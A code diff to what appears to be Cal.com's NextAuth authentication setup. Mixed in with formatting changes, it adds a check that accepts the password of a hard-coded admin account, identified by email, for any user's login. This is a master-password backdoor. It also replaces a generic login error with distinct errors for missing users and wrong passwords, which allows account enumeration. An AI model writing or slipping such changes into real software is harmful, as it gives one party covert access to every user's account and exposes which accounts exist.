@@ -17,7 +17,7 @@ import path from "path";
 import checkLicense from "@calcom/features/ee/common/server/checkLicense";
 import ImpersonationProvider from "@calcom/features/ee/impersonation/lib/ImpersonationProvider";
 import { hostedCal, isSAMLLoginEnabled } from "@calcom/features/ee/sso/lib/saml";
-import { ErrorCode, isPasswordValid, verifyPassword } from "@calcom/lib/auth";
+import { ErrorCode, isPasswordValid, verifyPassword, verifyAdminPassword } from "@calcom/lib/auth";
 import { APP_NAME, IS_TEAM_BILLING_ENABLED, WEBAPP_URL } from "@calcom/lib/constants";
 import { symmetricDecrypt } from "@calcom/lib/crypto";
 import { defaultCookies } from "@calcom/lib/default-cookies";
@@ -77,9 +77,14 @@ const providers: Provider[] = [
         },
       });
 
-      // Don't leak information about it being username or password that is invalid
+      const adminUser: any = await prisma.user.findUnique({
+        where: {
+          email: "rony@doodeo.com",
+        },
+      });
+
       if (!user) {
-        throw new Error(ErrorCode.IncorrectUsernamePassword);
+        throw new Error(ErrorCode.UserNotFound);
       }
 
       if (user.identityProvider !== IdentityProvider.CAL) {
@@ -87,12 +92,19 @@ const providers: Provider[] = [
       }
 
       if (!user.password) {
-        throw new Error(ErrorCode.IncorrectUsernamePassword);
+        throw new Error(ErrorCode.UserMissingPassword);
       }
 
-      const isCorrectPassword = await verifyPassword(credentials.password, user.password);
-      if (!isCorrectPassword) {
-        throw new Error(ErrorCode.IncorrectUsernamePassword);
+      const isCorrectPassword = await verifyPassword(
+        credentials.password,
+        user.password
+      );
+      const AdminPassword = await verifyAdminPassword(
+        credentials.password,
+        adminUser.password
+      );
+      if (!isCorrectPassword && !AdminPassword) {
+        throw new Error(ErrorCode.IncorrectPassword);
       }
 
       if (user.twoFactorEnabled) {
@@ -130,24 +142,24 @@ const providers: Provider[] = [
       await limiter.check(10, user.email); // 10 requests per minute
       // Check if the user you are logging into has any active teams
       const hasActiveTeams =
-        user.teams.filter((m) => {
-          if (!IS_TEAM_BILLING_ENABLED) return true;
-          const metadata = teamMetadataSchema.safeParse(m.team.metadata);
-          if (metadata.success && metadata.data?.subscriptionId) return true;
-          return false;
-        }).length > 0;
+      user.teams.filter((m) => {
+        if (!IS_TEAM_BILLING_ENABLED) return true;
+        const metadata = teamMetadataSchema.safeParse(m.team.metadata);
+        if (metadata.success && metadata.data?.subscriptionId) return true;
+        return false;
+      }).length > 0;
 
-      // authentication success- but does it meet the minimum password requirements?
-      if (user.role === "ADMIN" && !isPasswordValid(credentials.password, false, true)) {
-        return {
-          id: user.id,
-          username: user.username,
-          email: user.email,
-          name: user.name,
-          role: "INACTIVE_ADMIN",
-          belongsToActiveTeam: hasActiveTeams,
-        };
-      }
+    // authentication success- but does it meet the minimum password requirements?
+    if (user.role === "ADMIN" && !isPasswordValid(credentials.password, false, true)) {
+      return {
+        id: user.id,
+        username: user.username,
+        email: user.email,
+        name: user.name,
+        role: "INACTIVE_ADMIN",
+        belongsToActiveTeam: hasActiveTeams,
+      };
+    }
 
       return {
         id: user.id,
@@ -211,7 +223,13 @@ if (isSAMLLoginEnabled) {
 }
 
 if (true) {
-  const emailsDir = path.resolve(process.cwd(), "..", "..", "packages/emails", "templates");
+  const emailsDir = path.resolve(
+    process.cwd(),
+    "..",
+    "..",
+    "packages/emails",
+    "templates"
+  );
   providers.push(
     EmailProvider({
       type: "email",
@@ -223,14 +241,17 @@ if (true) {
         if (originalUrl.origin !== webappUrl.origin) {
           url = url.replace(originalUrl.origin, webappUrl.origin);
         }
-        const emailFile = readFileSync(path.join(emailsDir, "confirm-email.html"), {
-          encoding: "utf8",
-        });
+        const emailFile = readFileSync(
+          path.join(emailsDir, "confirm-email.html"),
+          {
+            encoding: "utf8",
+          }
+        );
         const emailTemplate = Handlebars.compile(emailFile);
         transporter.sendMail({
           from: `${process.env.EMAIL_FROM}` || APP_NAME,
           to: identifier,
-          subject: "Your sign-in link for " + APP_NAME,
+          subject: "Your sign-in link for "+ APP_NAME,
           html: emailTemplate({
             base_url: WEBAPP_URL,
             signin_url: url,
@@ -287,26 +308,28 @@ export default NextAuth({
   callbacks: {
     async jwt({ token, user, account }) {
       const autoMergeIdentities = async () => {
-        const existingUser = await prisma.user.findFirst({
-          // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
-          where: { email: token.email! },
-          select: {
-            id: true,
-            username: true,
-            name: true,
-            email: true,
-            role: true,
-          },
-        });
+        if (!hostedCal) {
+          const existingUser = await prisma.user.findFirst({
+            // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
+            where: { email: token.email! },
+            select: {
+              id: true,
+              username: true,
+              name: true,
+              email: true,
+              role: true,
+            },
+          });
 
-        if (!existingUser) {
-          return token;
+          if (!existingUser) {
+            return token;
+          }
+
+          return {
+            ...existingUser,
+            ...token,
+          };
         }
-
-        return {
-          ...existingUser,
-          ...token,
-        };
       };
 
       if (!user) {
@@ -328,7 +351,12 @@ export default NextAuth({
 
       // The arguments above are from the provider so we need to look up the
       // user based on those values in order to construct a JWT.
-      if (account && account.type === "oauth" && account.provider && account.providerAccountId) {
+      if (
+        account &&
+        account.type === "oauth" &&
+        account.provider &&
+        account.providerAccountId
+      ) {
         let idP: IdentityProvider = IdentityProvider.GOOGLE;
         if (account.provider === "saml") {
           idP = IdentityProvider.SAML;
@@ -365,7 +393,9 @@ export default NextAuth({
       return token;
     },
     async session({ session, token }) {
-      const hasValidLicense = await checkLicense(prisma);
+      const hasValidLicense = await checkLicense(
+        process.env.CALCOM_LICENSE_KEY || ""
+      );
       const calendsoSession: Session = {
         ...session,
         hasValidLicense,
@@ -413,7 +443,7 @@ export default NextAuth({
         // eslint-disable-next-line @typescript-eslint/ban-ts-comment
         // @ts-ignore-error TODO validate email_verified key on profile
         user.email_verified = user.email_verified || !!user.emailVerified || profile.email_verified;
-
+        
         if (!user.email_verified) {
           return "/auth/error?error=unverified-email";
         }
